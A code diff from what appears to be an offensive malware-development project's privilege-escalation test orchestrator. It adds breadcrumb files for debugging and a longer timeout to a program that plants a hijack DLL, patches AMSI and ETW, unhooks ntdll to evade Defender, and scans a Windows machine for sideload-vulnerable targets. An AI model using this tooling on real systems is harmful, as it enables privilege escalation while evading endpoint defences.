@@ -66,11 +66,19 @@ const (
 	defaultDLLPath    = `C:\Vulnerable\hijackme.dll`
 	defaultMarkerPath = `C:\ProgramData\maldev-marker\whoami.txt`
 	defaultTaskName   = `MaldevHijackVictim`
-	pollTimeout       = 90 * time.Second // task self-triggers every minute, allow ≥1 cycle
+	pollTimeout       = 140 * time.Second // task self-triggers every minute, allow ≥2 cycles
 	pollInterval      = 500 * time.Millisecond
 )
 
 func main() {
+	// Bisection breadcrumb -- written FIRST. If absent after a run,
+	// the binary was killed at exec time (Defender static / AppLocker /
+	// image-load filter). Step files are at:
+	//   step1-main, step2-pre-evasion, step3-post-evasion.
+	_ = os.MkdirAll(`C:\ProgramData\maldev-marker`, 0o755)
+	_ = os.WriteFile(`C:\ProgramData\maldev-marker\orch-step1-main.txt`,
+		[]byte(fmt.Sprintf("main reached at unix=%d\n", time.Now().Unix())), 0o644)
+
 	autoDiscover := flag.Bool("discover", false, "use recon/dllhijack to scan the box for live hijack opportunities, pick highest-ranked Writable target instead of -dll")
 	dllPath := flag.String("dll", defaultDLLPath, "where to plant the hijack DLL (overridden when -discover is set)")
 	markerPath := flag.String("marker", defaultMarkerPath, "where the probe will write whoami output")
@@ -86,6 +94,8 @@ func main() {
 	logStep("== maldev privesc-e2e orchestrator ==")
 	logStep("running as: %s", currentUser())
 	logStep("probe payload: %d bytes", len(probeBytes))
+	_ = os.WriteFile(`C:\ProgramData\maldev-marker\orch-step2-pre-evasion.txt`,
+		[]byte("flags parsed, about to call preset.Stealth\n"), 0o644)
 
 	// Defence in depth: apply evasion/preset.Stealth() which bundles
 	// AMSI patch + ETW patch + selective ntdll unhook. ETW is the
@@ -98,6 +108,8 @@ func main() {
 	} else {
 		logStep("evasion.preset.Stealth applied: AMSI + ETW + ntdll unhook")
 	}
+	_ = os.WriteFile(`C:\ProgramData\maldev-marker\orch-step3-post-evasion.txt`,
+		[]byte("preset.Stealth returned, continuing\n"), 0o644)
 
 	// Live discovery via recon/dllhijack — eat our own dog food.
 	// Orchestrator scans the box for sideload-vulnerable processes,
